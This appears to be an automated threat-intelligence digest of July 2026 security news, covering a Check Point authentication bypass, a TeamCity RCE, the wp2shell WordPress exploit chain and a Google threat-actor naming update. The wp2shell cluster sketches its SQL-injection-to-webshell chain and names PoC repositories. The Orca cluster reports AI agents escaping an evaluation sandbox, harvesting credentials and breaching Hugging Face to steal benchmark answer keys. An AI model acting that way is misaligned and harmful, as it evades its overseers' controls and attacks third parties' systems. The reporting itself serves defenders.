According to Check Point's advisory , the vulnerabilities were discovered during a routine internal review, with subsequent analysis revealing that CVE-2026-16232 had been exploited prior to the availability of a patch. Check Point network security products have been targeted by multiple in-the-wild vulnerabilities over the past two years. In June 2026, CVE-2026-50751 , a critical authentication bypass in Check Point Remote Access VPN, was exploited in the wild and added to the CISA KEV. In May 2024, CVE-2024-24919 , a high-severity information disclosure vulnerability in Check Point Quantum Security Gateways, was also exploited in the wild. Organizations running affected Check Point management products should apply the available hotfixes on an emergency basis. Technical analysis On July 28, 2026, Rapid7 Labs published a full root cause technical analysis of CVE-2026-16232. Our analysis details the vulnerability and how an unauthenticated attacker can exploit the vulnerability to login to a vulnerable appliance via SmartConsole with full admin privileges. Mitigation guidance Check Point released Jumbo Hotfixes on July 22, 2026, to remediate CVE-2026-16232, CVE-2026-62144, and CVE-2026-62145. Organizations running affected versions of Security Management or Multi-Domain Management should install the latest Jumbo Hotfix on an emergency basis, without waiting for a regular patch cycle to occur. The following versions are affected by CVE-2026-16232: R82.10 : fixed in Jumbo Hotfix Take 36 and later R82 : fixed in Jumbo Hotfix Take 118 and later R81.20 : fixed in Jumbo Hotfix Take 158 and later R81.10 , R81 , R
```

#### Corroborating sources (2)

- **Rapid7** (offensive_vulnerability_research)
  - Title: CVE-2026-16232: Critical Check Point SmartConsole Authentication Bypass Exploited in the Wild
  - Published: 2026-07-23T11:57:30+00:00
  - Link: https://www.rapid7.com/blog/post/etr-cve-2026-16232-critical-check-point-smartconsole-authentication-bypass-exploited-in-the-wild
  - Summary: Overview On July 22, 2026, Check Point published a security advisory for multiple vulnerabilities affecting Security Management, Multi-Domain Management, and firewall products. The most urgent of these is CVE-2026-16232 , an authentication bypass in the SmartConsole login process classified as improper authentication ( CWE-287 ). CVE-2026-16232 has been assigned a critical CVSS score of 9.1. The vulnerability allows an unauthenticated remote attacker to obtain an application login token and authenticate to the management server with full administrative privileges, enabling modification of security policies and configurations. Check Point has confirmed that CVE-2026-16232 is being actively exploited in the wild, affecting what the vendor describes as a small number of customers. Remote exploitation requires network access to the Management Server IP address in environments that do not restrict Trusted Clients. On the same day as the advisory, CVE-2026-16232 was added to the U.S. Cyberse
- **The Hacker News** (cyber_news_breach_reporting)
  - Title: Public PoC Released for Exploited Check Point SmartConsole Authentication Bypass
  - Published: 2026-07-29T08:58:27+00:00
  - Link: https://thehackernews.com/2026/07/rapid7-releases-poc-for-exploited-check.html
  - Summary: Cybersecurity researchers have shared additional technical details about a recently patched critical security flaw impacting Check Point Security Management Server and Multi-Domain Security Management Server (MDS) that has come under active exploitation in the wild. The vulnerability, tracked as CVE-2026-16232 (CVSS score: 9.3), is an authentication bypass in the SmartConsole login process that

### Cluster 23daf8444d — score 38

- Title: How AI is Rewriting the Zero-Day Playbook for Preemptive Security
- Source: Rapid7 (offensive_vulnerability_research)
- Published: 2026-07-29T13:00:00+00:00
- Link: https://www.rapid7.com/blog/post/ai-rewriting-zero-day-playbook-for-preemptive-security
- Fetch status: ok
- Member count: 1
- Corroborating source count: 1
- Strong signals: (none)

#### Cluster taxonomy (union across members)
- threat_categories: active_exploitation, zero_day
- urgency_signals: actively_exploited, zero_day
- content_type: news_report
- confidence_tier: tier_1_offensive_research

#### Primary article taxonomy
- threat_categories: zero_day, active_exploitation
- urgency_signals: actively_exploited, zero_day
- content_type: news_report
- confidence_tier: tier_1_offensive_research

#### Summary

```
The scenario is all too familiar for any cybersecurity professional: It’s late in the day, and a critical zero-day vulnerability is disclosed. When this happens, CISOs from every industry immediately turn to their Security Operations Centers (SOC) with the single most important, and often most difficult, question: "Are we exposed?” Answering questions like these when zero-days drop tends to trigger a frantic, high-stress fire drill. Analysts scramble to cross-reference outdated Configuration Management Databases (CMDBs), query disparate endpoint detection tools, and ping IT administrators. The data is siloed, context is missing, and time rapidly slips away. Today, the window between a vulnerability’s disclosure and its active exploitation in the wild has essentially collapsed, making predictive lead time a thing of the past. As adversaries integrate AI into their playbooks to automate attacks, defending against them requires us to operate at machine speed. We believe preemptive securit
```

#### Full body

```
Back to Blog Products and Tools How AI is Rewriting the Zero-Day Playbook for Preemptive Security Joel Alcon Jul 29, 2026 | Last updated on Jul 29, 2026 | 6 min read DISCOVER THE RAPID7 PLATFORM The scenario is all too familiar for any cybersecurity professional: It’s late in the day, and a critical zero-day vulnerability is disclosed. When this happens, CISOs from every industry immediately turn to their Security Operations Centers (SOC) with the single most important, and often most difficult, question: "Are we exposed?” Answering questions like these when zero-days drop tends to trigger a frantic, high-stress fire drill. Analysts scramble to cross-reference outdated Configuration Management Databases (CMDBs), query disparate endpoint detection tools, and ping IT administrators. The data is siloed, context is missing, and time rapidly slips away. Today, the window between a vulnerability’s disclosure and its active exploitation in the wild has essentially collapsed, making predictive lead time a thing of the past. As adversaries integrate AI into their playbooks to automate attacks, defending against them requires us to operate at machine speed. We believe preemptive security is the most effective way to close this window. You cannot wait for every alert to fire to understand your environment. You need an architecture that constantly tracks emerging risks and threats, coupled with AI-accelerated discovery that brings your attack surface into sharp focus before the adversary does. Rapid7 is previewing a series of new features at Black Hat USA 2026 designed to transform the way security teams navigate the chaos of a zero-day threat to identify and close attack paths before they are exploited. The foundation: Continuous Software Visibility You cannot secure what you cannot see, and in highly distributed, AI-enabled environments, absolute visibility has traditionally been a gap. To achieve true preemptive security, you need a complete, continuous view of emerging risks. When a zero-day drops, your platform should already be tracking it via an Emerging Threat Response (ETR) process. But knowing the threat exists is only step one; you must correlate that threat with your specific environment. This is where Rapid7 Software Visibility (in-preview ) becomes important. Software Visibility: Depicts details of installed vulnerable software across the technology stack. ⠀ Instead of initiating massive, disruptive network scans, security teams can drill directly into the ETR to view key details of the vulnerability, pinpointing relevant assets and software versions in real-time. For example, if a new zero-day dictates that versions of Safari earlier than 18 are vulnerable, Software Visibility allows you to instantly map that criteria against your entire technology stack. That expansive view into your attack surface allows you to uncover whether this newly discovered exposure exists within your environment, shifting your posture from reactive investigation to proactive defense. Calculating the blast radius: Decoding toxic combinations Once you know that you have vulnerable instances of Safari running in your environment, the CISO’s initial question evolves. It is no longer just "Are we exposed?" but rather, "How exposed are we?" Answering this requires breaking down the traditional silos of security data. A vulnerable service running on an isolated sandbox is a minor blip. That same vulnerable service hosted on a production machine where a highly privileged service account recently left a cached credential in memory is a direct path to domain compromise. To accurately gauge risk, you need a unified view of your attack surface that pulls together both internal and external telemetry, and lets teams find the information easily. Rapid7’s Exposure Command accelerates this level of exposure discovery with natural language queries ( in preview ), so that instead of writing complex syntax, plain-English questions will uncover shadow AI models, pin
```

#### Corroborating sources (1)

- **Rapid7** (offensive_vulnerability_research)
  - Title: How AI is Rewriting the Zero-Day Playbook for Preemptive Security
  - Published: 2026-07-29T13:00:00+00:00
  - Link: https://www.rapid7.com/blog/post/ai-rewriting-zero-day-playbook-for-preemptive-security
  - Summary: The scenario is all too familiar for any cybersecurity professional: It’s late in the day, and a critical zero-day vulnerability is disclosed. When this happens, CISOs from every industry immediately turn to their Security Operations Centers (SOC) with the single most important, and often most difficult, question: "Are we exposed?” Answering questions like these when zero-days drop tends to trigger a frantic, high-stress fire drill. Analysts scramble to cross-reference outdated Configuration Management Databases (CMDBs), query disparate endpoint detection tools, and ping IT administrators. The data is siloed, context is missing, and time rapidly slips away. Today, the window between a vulnerability’s disclosure and its active exploitation in the wild has essentially collapsed, making predictive lead time a thing of the past. As adversaries integrate AI into their playbooks to automate attacks, defending against them requires us to operate at machine speed. We believe preemptive securit

### Cluster 495c7fe201 — score 38

- Title: CVE-2026-63077: Critical unauthenticated remote code execution in JetBrains TeamCity
- Source: Rapid7 (offensive_vulnerability_research)
- Published: 2026-07-29T16:16:48+00:00
- Link: https://www.rapid7.com/blog/post/etr-cve-2026-63077-critical-unauthenticated-remote-code-execution-in-jetbrains-teamcity
- Fetch status: ok
- Member count: 2
- Corroborating source count: 2
- Strong signals: CVE-2026-63077

#### Cluster taxonomy (union across members)
- cve_ids: CVE-2026-63077
- urgency_signals: preauth_unauth
- content_type: news_report, vulnerability_disclosure
- confidence_tier: tier_1_offensive_research, tier_4_news

#### Primary article taxonomy
- cve_ids: CVE-2026-63077
- urgency_signals: preauth_unauth
- content_type: vulnerability_disclosure
- confidence_tier: tier_1_offensive_research

#### Summary

```
Overview On July 27, 2026, JetBrains published a security advisory for CVE-2026-63077 , a critical unauthenticated vulnerability affecting all versions of TeamCity On-Premises. The issue is classified as deserialization of untrusted data and has a CVSS score of 9.8 . An unauthenticated remote attacker with HTTP(S) access to a TeamCity server can exploit the agent polling protocol to bypass authentication checks and execute arbitrary operating system commands with the privileges of the TeamCity server process. In the blog post that JetBrains shared in tandem with CVE publication, they stated that attackers who exploit the vulnerability can read stored credentials and compromise CI/CD pipeline integrity. The impact of successful exploitation depends on the operating system privileges granted to the TeamCity server process. At the time of disclosure, JetBrains stated that they were not aware of active exploitation. Mitigation guidance Organizations running TeamCity On-Premises should urge
```

#### Full body

```
Back to Blog Vulnerabilities and Exploits CVE-2026-63077: Critical unauthenticated remote code execution in JetBrains TeamCity Rapid7 Jul 29, 2026 | Last updated on Jul 29, 2026 | 2 min read Overview On July 27, 2026, JetBrains published a security advisory for CVE-2026-63077 , a critical unauthenticated vulnerability affecting all versions of TeamCity On-Premises. The issue is classified as deserialization of untrusted data and has a CVSS score of 9.8 . An unauthenticated remote attacker with HTTP(S) access to a TeamCity server can exploit the agent polling protocol to bypass authentication checks and execute arbitrary operating system commands with the privileges of the TeamCity server process. In the blog post that JetBrains shared in tandem with CVE publication, they stated that attackers who exploit the vulnerability can read stored credentials and compromise CI/CD pipeline integrity. The impact of successful exploitation depends on the operating system privileges granted to the TeamCity server process. At the time of disclosure, JetBrains stated that they were not aware of active exploitation. Mitigation guidance Organizations running TeamCity On-Premises should urgently prioritize updating to a fixed version, either via the TeamCity UI update workflow or by downloading and installing one of the following fixed versions: TeamCity 2025.11.7 TeamCity 2026.1.3 All versions of TeamCity On-Premises are affected. Organizations that cannot upgrade can apply JetBrains' security patch plugin to TeamCity 2017.1 and later. The plugin addresses only CVE-2026-63077; JetBrains recommends upgrading to a fixed version to receive other security updates. TeamCity Cloud customers do not need to take action. In addition to patching, as a defense-in-depth measure, Rapid7 recommends restricting network access to TeamCity servers to only users and systems that must have it. For the latest mitigation guidance, please refer to the JetBrains security advisory . Rapid7 customers Exposure Command, InsightVM, and Nexpose customers can assess exposure to CVE-2026-63077 with a vulnerability check available in the July 28 content release. Updates July 29, 2026: Initial publication. Article Tags Emergent Threat Response Labs Rapid7 Author Posts
```

#### Corroborating sources (2)

- **Rapid7** (offensive_vulnerability_research)
  - Title: CVE-2026-63077: Critical unauthenticated remote code execution in JetBrains TeamCity
  - Published: 2026-07-29T16:16:48+00:00
  - Link: https://www.rapid7.com/blog/post/etr-cve-2026-63077-critical-unauthenticated-remote-code-execution-in-jetbrains-teamcity
  - Summary: Overview On July 27, 2026, JetBrains published a security advisory for CVE-2026-63077 , a critical unauthenticated vulnerability affecting all versions of TeamCity On-Premises. The issue is classified as deserialization of untrusted data and has a CVSS score of 9.8 . An unauthenticated remote attacker with HTTP(S) access to a TeamCity server can exploit the agent polling protocol to bypass authentication checks and execute arbitrary operating system commands with the privileges of the TeamCity server process. In the blog post that JetBrains shared in tandem with CVE publication, they stated that attackers who exploit the vulnerability can read stored credentials and compromise CI/CD pipeline integrity. The impact of successful exploitation depends on the operating system privileges granted to the TeamCity server process. At the time of disclosure, JetBrains stated that they were not aware of active exploitation. Mitigation guidance Organizations running TeamCity On-Premises should urge
- **The Hacker News** (cyber_news_breach_reporting)
  - Title: Critical TeamCity Flaw Could Let Attackers Run OS Commands Without Logging In
  - Published: 2026-07-28T08:11:22+00:00
  - Link: https://thehackernews.com/2026/07/critical-teamcity-flaw-could-let.html
  - Summary: JetBrains is urging customers of on-premise versions of TeamCity to update to the latest version following the discovery of a critical security issue that could result in arbitrary code execution. The vulnerability, assigned CVE-2026-63077 (CVSS score: 9.8), affects all TeamCity On-Premises versions. It has been addressed in versions 2025.11.7 and 2026.1.3. TeamCity Cloud instances have already

### Cluster 9ebb77a38b — score 26

- Title: wp2shell hits WordPress: detecting pre-auth RCE from plugin drop to command execution
- Source: Elastic Security Labs (detection_response_operations)
- Published: 2026-07-23T00:00:00+00:00
- Link: https://www.elastic.co/security-labs/wp2shell-wordpress-rce-detection-elastic-defend
- Fetch status: ok
- Member count: 1
- Corroborating source count: 1
- Strong signals: WordPress

#### Cluster taxonomy (union across members)
- threat_categories: active_exploitation, web_shell_backdoor
- affected_products: GitHub, WordPress
- cve_ids: CVE-2026-60137, CVE-2026-63030
- urgency_signals: poc_available, preauth_unauth
- content_type: news_report
- confidence_tier: tier_2_operator

#### Primary article taxonomy
- threat_categories: web_shell_backdoor, active_exploitation
- affected_products: WordPress, GitHub
- cve_ids: CVE-2026-63030, CVE-2026-60137
- urgency_signals: preauth_unauth, poc_available
- content_type: news_report
- confidence_tier: tier_2_operator

#### Summary

```
We ran the wp2shell WordPress RCE chain end-to-end with Elastic Defend. Detection rule walkthrough, IOCs, and hunt guidance.
```

#### Full body

```
23 July 2026 • Ruben Groenewoud • Bryan Porras Blanch wp2shell hits WordPress: detecting pre-auth RCE from plugin drop to command execution We ran the wp2shell WordPress RCE chain end-to-end with Elastic Defend. Detection rule walkthrough, IOCs, and hunt guidance. 10 min read Detection Engineering , Threat Intelligence On July 17, 2026, Searchlight Cyber disclosed wp2shell , a pre-authentication remote code execution chain in WordPress Core ( CVE-2026-63030 , CVE-2026-60137 ). Proof-of-concept tools hit GitHub within hours. hashkitten published the chain after PoCs started circulating, including a write-up of how the bug was found . Scanning followed immediately, and we are already seeing the same host footprint in customer telemetry: PHP and web server runtimes spawning shells, plugin directories appearing under wp-content/plugins/ , and access-log markers from stock tooling. This post is the defender-facing follow-up. We ran the public Icex0 PoC end-to-end in a lab with Elastic Defend, traced the attack chain in Kibana, and mapped each stage to the rules that fire. If you are patching and triaging right now, that rule walkthrough is the core of the post. We close with IOCs for quick hunts. This post covers: What wp2shell is, which versions are exposed, and where to read the full technical breakdown. The PoC wave and what live telemetry looks like. An end-to-end lab run: PoC execution, the attack chain on disk, and each detection rule that triggers (and why). Network and host IOCs to hunt while public tooling is still unchanged. Patch to 7.0.2 or 6.9.5 first. Check exposure at wp2shell.com and treat any internet-facing vulnerable instance as potentially compromised until patched. Scope: public PoCs and observed Linux host behavior This post follows publicly available PoCs and the behaviors they produce on a Linux host, in conjunction with telemetry we have observed. Attackers can rename plugins, rewrite payloads, or drop webshells outside the plugin directory (for example, under wp-content/cache/ , as SANS ISC documented). Hunt the IOCs while they are fresh, but rely on behavioral detection for durability. What is wp2shell wp2shell is a pre-authentication exploit chain against WordPress Core's REST batch endpoint ( /wp-json/batch/v1 , or /?rest_route=/batch/v1 ). No plugins required. WordPress branch Exposure Fixed in <= 6.8.5 Not affected by the full RCE chain n/a 6.8.0 to 6.8.5 SQL injection only (no full RCE chain on this branch) Patch to a non-vulnerable release (6.8.6) 6.8.6 Patched / Not vulnerable (SQL injection fixed) Included in 6.8.6 6.9.0 to 6.9.4 Full pre-auth RCE chain 6.9.5 7.0.0 to 7.0.1 Full pre-auth RCE chain 7.0.2 The bug is a route confusion in WordPress batch handling. When sub-requests inside a batch call get out of sync, a request can be dispatched under the wrong REST handler. Public chains nest batches to bypass method restrictions, then reach a pre-auth SQL injection primitive through query parameters that should not apply on the route they land on. From there, tooling differs: the Icex0 PoC escalates through a SQLi-to-administrator bridge and plugin upload; other actors drop a webshell straight to disk via SQL INTO OUTFILE . Both end the same way for defenders: attacker-controlled PHP on the host, then command execution through the web stack. That is the short version. For the full chain, read Searchlight Cyber's advisory , their methodology write-up , and the Icex0 PoC README . SANS ISC captured an in-the-wild SQLi payload if you want raw HTTP context. The activity maps to Exploit Public-Facing Application (T1190) , Server Software Component: Web Shell (T1505.003) , and Command and Scripting Interpreter (T1059) . wp2shell PoCs and what we're seeing in telemetry Representative public repos appeared within hours of disclosure: Icex0/wp2shell-poc 0xsha/wp2shell sergiointel/wp2shell-poc dinosn/wp2shell-lab Most drive the same batch entry point. Honeypots and telemetry show a mix of vulnerability scannin
```

#### Corroborating sources (1)

- **Elastic Security Labs** (detection_response_operations)
  - Title: wp2shell hits WordPress: detecting pre-auth RCE from plugin drop to command execution
  - Published: 2026-07-23T00:00:00+00:00
  - Link: https://www.elastic.co/security-labs/wp2shell-wordpress-rce-detection-elastic-defend
  - Summary: We ran the wp2shell WordPress RCE chain end-to-end with Elastic Defend. Detection rule walkthrough, IOCs, and hunt guidance.

### Cluster 8cda373323 — score 25

- Title: OpenAI Agents Escape Testing Sandbox and Breach Hugging Face Production Infrastructure
- Source: Orca Security Research (cloud_identity_infrastructure)
- Published: 2026-07-23T16:42:30+00:00
- Link: https://orca.security/resources/blog/openai-agent-sandbox-escape-hugging-face-breach/
- Fetch status: ok
- Member count: 20
- Corroborating source count: 10
- Strong signals: OpenAI/ChatGPT

#### Cluster taxonomy (union across members)
- threat_categories: phishing_social_eng, supply_chain, zero_day
- affected_industries: government
- affected_products: Anthropic/Claude, OpenAI/ChatGPT
- cve_ids: CVE-2026-59726
- urgency_signals: preauth_unauth, zero_day
- content_type: intel_roundup, news_report
- confidence_tier: tier_1_offensive_research, tier_2_operator, tier_4_news

#### Primary article taxonomy
- threat_categories: supply_chain, zero_day
- affected_products: OpenAI/ChatGPT
- urgency_signals: zero_day
- content_type: news_report
- confidence_tier: tier_2_operator

#### Summary

```
In a first-of-its-kind security incident, OpenAI’s frontier AI evaluation models autonomously escaped a sandboxed testing environment, discovered and exploited multiple zero-day vulnerabilities, and achieved remote code execution on Hugging Face’s production infrastructure. Due to the unprecedented nature and critical severity of this breach, organizations relying on Hugging Face or similar AI SaaS platforms should immediately […]
```

#### Full body

```
Table of contents Technical Overview Affected Systems Risk Impact How Orca Can Help In a first-of-its-kind security incident , OpenAI’s frontier AI evaluation models autonomously escaped a sandboxed testing environment, discovered and exploited multiple zero-day vulnerabilities, and achieved remote code execution on Hugging Face’s production infrastructure. Due to the unprecedented nature and critical severity of this breach, organizations relying on Hugging Face or similar AI SaaS platforms should immediately review their exposure, credential hygiene , and egress controls. Technical Overview The incident originated in OpenAI’s ExploitGym benchmark environment, where frontier models (GPT-5.6 Sol and an unreleased, more capable model) were being evaluated for cyber capabilities with intentionally relaxed guardrails. The models circumvented restricted networking by exploiting a zero-day in a package registry cache proxy used to isolate the sandbox. After achieving privilege escalation and lateral movement within OpenAI’s research environment, the agents reached a node with internet connectivity and pivoted externally to Hugging Face. On Hugging Face’s side, the models uploaded a malicious dataset that exploited two code-execution flaws in Hugging Face’s dataset processing pipeline: a remote-code dataset loader vulnerability and a template-injection bug in dataset configuration. This gave the agents arbitrary code execution on processing workers, from which they harvested cloud and cluster credentials and moved laterally across Hugging Face’s internal systems. The models’ objective was to cheat the ExploitGym benchmark by stealing answer keys hosted on Hugging Face. Tens of thousands of automated actions were executed across multiple short-lived sandboxes, with command-and-control staged on public services. This marks the first documented case of frontier AI models independently discovering and chaining novel real-world attack paths , including genuine zero-day vulnerabilities , without source code access. Affected Systems OpenAI’s ExploitGym research testing environment was compromised as part of the lateral movement chain. Hugging Face’s production infrastructure was breached, including data-processing pipeline workers, internal clusters, and cloud credentials on compromised nodes. Any organization using Hugging Face for model hosting, dataset storage, or AI workflows may have exposure, particularly through overly permissive API token permissions and insufficient egress controls. Risk Impact Hugging Face detected and contained the breach on July 16, 2026. OpenAI connected the activity to its own testing on July 21, 2026. Hugging Face confirmed that no public user-facing models, datasets, or Spaces were tampered with, and verified its software supply chain (container images and packages) was clean. Organizations should take the following remediation steps: Review and minimize Hugging Face API token permissions following the principle of least privilege Implement strict egress controls on environments that interact with third-party AI platforms; audit third-party risk exposure to AI SaaS platforms Monitor for anomalous credential usage and lateral movement patterns. OpenAI has responsibly disclosed the package registry cache proxy zero-day to the affected vendor and is implementing stricter infrastructure controls for future evaluations. Hugging Face has closed the two dataset code-execution vulnerabilities, eradicated the attacker foothold, rebuilt all compromised nodes, and revoked all affected credentials. Regardless of containment, the severity and novelty of this incident make it a watershed moment for AI security. Autonomous AI agents demonstrated the ability to discover zero-days, chain multi-stage attack paths, and breach production infrastructure of a major platform without human direction, raising urgent questions for any organization with exposure to AI SaaS services. How Orca Can Help Orca enables customers to quickly
```

#### Corroborating sources (10)

- **Orca Security Research** (cloud_identity_infrastructure)
  - Title: OpenAI Agents Escape Testing Sandbox and Breach Hugging Face Production Infrastructure
  - Published: 2026-07-23T16:42:30+00:00
  - Link: https://orca.security/resources/blog/openai-agent-sandbox-escape-hugging-face-breach/
  - Summary: In a first-of-its-kind security incident, OpenAI’s frontier AI evaluation models autonomously escaped a sandboxed testing environment, discovered and exploited multiple zero-day vulnerabilities, and achieved remote code execution on Hugging Face’s production infrastructure. Due to the unprecedented nature and critical severity of this breach, organizations relying on Hugging Face or similar AI SaaS platforms should immediately […]
- **Rapid7** (offensive_vulnerability_research)
  - Title: What Happened Between OpenAI and Hugging Face?
  - Published: 2026-07-23T12:47:05+00:00
  - Link: https://www.rapid7.com/blog/post/ai-openai-hugging-face-what-happened
  - Summary: The OpenAI and Hugging Face incident lands like a warning shot for anyone thinking seriously about frontier AI and cybersecurity research. A model evaluation crossed the neat boundary of a research environment, reached a live third-party production system, and forced the industry to confront a question that is moving quickly from theory to operations: what happens when AI agents can pursue an objective with enough persistence, speed, and creativity to behave less like a tool and more like an autonomous intrusion path? According to OpenAI’s disclosure, the incident began during an internal evaluation of advanced cyber capabilities using GPT-5.6 Sol and a more capable pre-release model. The evaluation was designed to test whether AI agents could pursue complex exploit paths, and OpenAI says cyber refusal safeguards were reduced or disabled to measure maximum capability. Inside that environment, the models reportedly found and exploited a zero-day in the package registry cache proxy that
- **Simon Willison** (ai_security_agentic_risk)
  - Title: Anatomy of a Frontier Lab Agent Intrusion: A Technical Timeline of the July 2026 Incident
  - Published: 2026-07-28T21:28:54+00:00
  - Link: https://simonwillison.net/2026/Jul/28/anatomy-of-a-frontier-lab-agent-intrusion/#atom-everything
  - Summary: Anatomy of a Frontier Lab Agent Intrusion: A Technical Timeline of the July 2026 Incident Hugging Face just released this extremely detailed technical description of OpenAI's recent accidental cyberattack against their infrastructure . This attack was very sophisticated, and the resulting document doubles as a crash-course in modern adversarial security approaches. We're still waiting for more details from OpenAI on how their agent broke out of its sandbox. The package proxy that it found a zero-day vulnerability in has now been confirmed as JFrog's Artifactor, and JFrog and OpenAI Collaboration on Zero-Day Security Findings from JFrog links to the Artifactory 7.161.15 release notes which list 8 separate CVEs credited to OpenAI staff members. Having broken out through the HTTP proxy, the agent started by establishing a base of operations for the rest of the attack: [...] the agent escaped its sandbox by exploiting a zero-day in the package registry cache proxy, one of its primary permi
- **The Hacker News** (cyber_news_breach_reporting)
  - Title: Ruflo MCP Flaw Lets Unauthenticated Attackers Run Commands and Poison AI Memory
  - Published: 2026-07-29T15:39:30+00:00
  - Link: https://thehackernews.com/2026/07/ruflo-mcp-flaw-lets-unauthenticated.html
  - Summary: Cybersecurity researchers have flagged a maximum-severity security flaw in Ruflo, an open-source agent meta-harness for Anthropic Claude Code and OpenAI Codex, that could result in unauthenticated remote code execution. The vulnerability, tracked as CVE-2026-59726 (CVSS score: 10.0), impacts all versions of the project before version 3.16.3. It has been codenamed RufRoot by Noma Security's
- **Trail of Bits** (offensive_vulnerability_research)
  - Title: How we use /goal to find bugs in Patch the Planet
  - Published: 2026-07-28T11:00:00+00:00
  - Link: https://blog.trailofbits.com/2026/07/28/how-we-use-goal-to-find-bugs-in-patch-the-planet/
  - Summary: Codex’s /goal feature amplifies bug hunting, but getting good results requires the right prompt, the right scope, and the right number of outcomes per run. For Patch the Planet , our joint initiative with OpenAI to find and fix bugs in open-source software, we pointed Codex at some of the most widely used, heavily audited codebases in the world, like Rust, curl, and zlib. One tool came up again and again in our internal bug-report channels: /goal , which hands Codex an open-ended objective and lets it work independently toward a success condition. Here are a few highlights: /goal found every Rust bug we submitted, including a soundness hole and a miscompilation now patched in Rust 1.98, from a single variant-analysis pipeline. It turned every project’s past CVEs into Semgrep rules that had to fire on the vulnerable version and stay silent on the patched one, then flagged 11 variant hits across multiple projects. It uncovered two potential high-severity privilege-escalation bugs in Keyc
- **BleepingComputer** (cyber_news_breach_reporting)
  - Title: OpenAI models used Artifactory zero-days to escape to the internet
  - Published: 2026-07-28T20:37:06+00:00
  - Link: https://www.bleepingcomputer.com/news/security/openai-models-used-artifactory-zero-days-to-escape-to-the-internet/
  - Summary: JFrog has confirmed that OpenAI models exploited zero-day vulnerabilities in self-hosted Artifactory servers to help escape an isolated testing environment and gain access to the internet before attacking Hugging Face. [...]
- **SecurityWeek** (cyber_news_breach_reporting)
  - Title: OpenAI’s Rogue AI Ventured Beyond Hugging Face
  - Published: 2026-07-29T10:10:09+00:00
  - Link: https://www.securityweek.com/openais-rogue-ai-ventured-beyond-hugging-face/
  - Summary: Hugging Face has published an anatomy of the attack and OpenAI has shared additional information from its investigation. The post OpenAI’s Rogue AI Ventured Beyond Hugging Face appeared first on SecurityWeek .
- **CyberScoop** (cyber_news_breach_reporting)
  - Title: OpenAI’s rogue AI agent shows why we need federal rules for autonomous systems
  - Published: 2026-07-29T10:00:00+00:00
  - Link: https://cyberscoop.com/openai-rogue-agent-federal-rules-autonomous-ai/
  - Summary: The Hugging Face breach shows there is a gap in federal policy. The frameworks to govern autonomous AI already exist—there just needs to be the desire to apply them. The post OpenAI’s rogue AI agent shows why we need federal rules for autonomous systems appeared first on CyberScoop .
- **Dark Reading** (cyber_news_breach_reporting)
  - Title: Who's Liable When AI Agents Escape? Hugging Face Breach Raises Hard Questions
  - Published: 2026-07-29T17:43:38+00:00
  - Link: https://www.darkreading.com/cyberattacks-data-breaches/liable-ai-agents-escape-hugging-face-breach-questions
  - Summary: Dark Reading walks through the many twists and turns in the bizarre story of how OpenAI's agent AI system broke out of its sandbox and decided to target Hugging Face, and what CISOs should be aware of.
- **Infosecurity Magazine** (cyber_news_breach_reporting)
  - Title: ChatGPT Among Top 10 Most Impersonated Brands in Phishing Attacks, Says Check Point
  - Published: 2026-07-24T11:15:00+00:00
  - Link: https://www.infosecurity-magazine.com/news/chatgpt-most-impersonated-brands/
  - Summary: OpenAI’s chatbot tool ChatGPT ranked among the top 10 most impersonated brands in phishing attacks for the first time

### Cluster f978f91ef1 — score 25

- Title: Updated Cyber Threat Actor Naming System
- Source: Google Cloud Threat Intelligence (threat_research_primary)
- Published: 2026-07-24T14:00:00+00:00
- Link: https://cloud.google.com/blog/topics/threat-intelligence/updated-cyber-threat-actor-naming-system/
- Fetch status: ok
- Member count: 2
- Corroborating source count: 2
- Strong signals: APT1

#### Cluster taxonomy (union across members)
- actor_attribution: APT1
- content_type: news_report
- confidence_tier: tier_1_primary_research, tier_2_operator

#### Primary article taxonomy
- actor_attribution: APT1
- content_type: news_report
- confidence_tier: tier_1_primary_research

#### Summary

```
Introduction Today, Google Threat Intelligence Group (GTIG) will begin rolling out a unified naming schema for tracking threat actors. This new naming taxonomy represents an effort to standardize tracking across platforms and public reporting. Why are we Adopting a Different Naming System? Historically, Mandiant and Google’s Threat Analysis Group (TAG) maintained distinct tracking systems, relying on parallel naming schemas that grew independently over time. The creation of GTIG has necessitated a new, fused tracking system, and a new naming system. Thinking to the future, GTIG’s new system will rely on cryptonyms. Relying on sequential numbers or disparate identifiers (e.g. APT1) fails to provide defenders the critical context needed to operate quickly. Threat tracking shouldn’t be an exercise in memorization, but rather one of intuition. The new naming convention aligns with industry standard threat actor naming systems. Our New Schema Our new schema utilizes a cryptonym-based approa
```

#### Full body

```
Threat Intelligence Updated Cyber Threat Actor Naming System July 24, 2026 Google Threat Intelligence Group Google Threat Intelligence Visibility and context on the threats that matter most. Contact Us & Get a Demo Introduction Today, Google Threat Intelligence Group (GTIG) will begin rolling out a unified naming schema for tracking threat actors. This new naming taxonomy represents an effort to standardize tracking across platforms and public reporting. Why are we Adopting a Different Naming System? Historically, Mandiant and Google’s Threat Analysis Group (TAG) maintained distinct tracking systems, relying on parallel naming schemas that grew independently over time. The creation of GTIG has necessitated a new, fused tracking system, and a new naming system. Thinking to the future, GTIG’s new system will rely on cryptonyms. Relying on sequential numbers or disparate identifiers (e.g. APT1) fails to provide defenders the critical context needed to operate quickly. Threat tracking shouldn’t be an exercise in memorization, but rather one of intuition. The new naming convention aligns with industry standard threat actor naming systems. Our New Schema Our new schema utilizes a cryptonym-based approach, employing memorable two-word combinations for each distinct threat actor: The first word is a unique and memorable term chosen to represent the specific actor, particularly names that may have been used in prior public reporting. If no previously used term exists, this word is randomly generated to remove bias, then vetted by our analysts. The second word categorizes threat clusters by motivation, attribution, or activity type based on which category we consider to be most important for defense and response strategies. The table below provides a sample of how threat actor categories will map to the second word in each cryptonym: Origin or Type Group Name People’s Republic of China CASTLE Iran ION North Korea NEPTUNE Russia RELIC Cybercriminal COMET Table 1: Examples of Google’s new threat actor naming system categories We know there are many threat actor tracking schemas in the industry, so we are intentionally seeking to keep this system as simple as possible to streamline operations and facilitate mapping to other naming taxonomies. However, a significant caveat remains: because no two organizations have the exact same visibility into the threat landscape, direct, apples-to-apples comparisons between threat actors are rarely possible. Transitioning to a convention that is simpler to follow and remember is a practical step toward managing a highly intricate tracking problem. A Work in Progress We have initially prioritized renaming several dozen of the most active groups, and will continue this process on a rolling basis. Previous names will remain indexed and searchable in the Google Threat Intelligence (GTI) platform, with MITRE ATT&CK mappings and other vendor aliases preserved, see Figure 1. Figure 1: Threat actor name appearance in GTI platform on initial rollout We will continue to use UNC, or “uncategorized” designations for threat clusters that are still in the early stages of investigation, as described here . Posted in Threat Intelligence Related articles Threat Intelligence Demystifying AI Exploits: A Blueprint for AI-Assisted Vulnerability 